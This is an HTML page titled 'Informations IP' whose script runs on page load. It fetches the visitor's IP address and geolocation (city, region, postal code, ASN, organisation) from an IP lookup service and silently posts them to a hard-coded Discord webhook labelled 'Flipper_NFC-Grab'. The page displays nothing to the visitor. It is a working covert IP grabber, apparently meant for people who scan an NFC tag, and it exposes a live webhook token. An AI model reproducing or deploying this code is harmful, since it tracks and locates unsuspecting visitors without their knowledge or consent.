<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations IP</title>
</head>
<body>
    <script>
      const webhookURL = "https://discord.com/api/webhooks/1200825443440410654/CUHzsVF5cH_UROU0oTnkCwTcaufl9YtozZD7YsW5Y4dxnMRHBnb1usmpb9nr5_19NmSp";
      var url = "https://ipapi.co/json/";
      var jsonData;

      // Effectuer une demande GET pour récupérer les données JSON du site
      fetch(url)
          .then(response => response.json())
          .then(data => {
              // Assigner les données JSON à la variable globale
              jsonData = data;

              // Appeler la fonction pour envoyer le webhook après avoir récupéré les données
              envoyerWebhook(creerEmbed());
          });

      function creerEmbed() {
          return {
              embeds: [
                  {
                      color: 4321431,
                      timestamp: "2024-02-29T17:24:47.123Z",
                      author: {
                          icon_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                          name: "Flipper_NFC-Grab"
                      },
                      thumbnail: {
                          url: "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                      fields: [
                      { name: "IP", value: jsonData.ip, inline: false },
                      { name: "City", value: jsonData.city, inline: false },
                      { name: "Region", value: jsonData.region, inline: false },
                      { name: "Region Code", value: jsonData.region_code, inline: false },
                      { name: "Country", value: jsonData.country, inline: false },
                      { name: "Country Name", value: jsonData.country_name, inline: false },
                      { name: "Continent Code", value: jsonData.continent_code, inline: false },
                      { name: "In EU", value: jsonData.in_eu, inline: false },
                      { name: "Postal", value: jsonData.postal, inline: false },
                      { name: "Timezone", value: jsonData.timezone, inline: false },
                      { name: "UTC Offset", value: jsonData.utc_offset, inline: false },
                      { name: "Languages", value: jsonData.languages, inline: false },
                      { name: "Country Calling Code", value: jsonData.country_calling_code, inline: false },
                      { name: "Currency", value: jsonData.currency, inline: false },
                      { name: "ASN", value: jsonData.asn, inline: false },
                      { name: "Organization", value: jsonData.org, inline: false }
                      ],
                      title: "Nouveau scan ! Voici les informations :"
                  }
              ]
          };
      }

      function envoyerWebhook(embed) {
          // Création de l'objet de la requête
          const request = new XMLHttpRequest();

          // Configuration de la requête
          request.open("POST", webhookURL);
          request.setRequestHeader('Content-type', 'application/json');

          // Envoi de la requête avec les données JSON
          request.send(JSON.stringify(embed));

          // Affichage dans la console pour vérification
          console.log("Message envoyé au webhook :", embed);
      }
    </script>
</body>
</html>
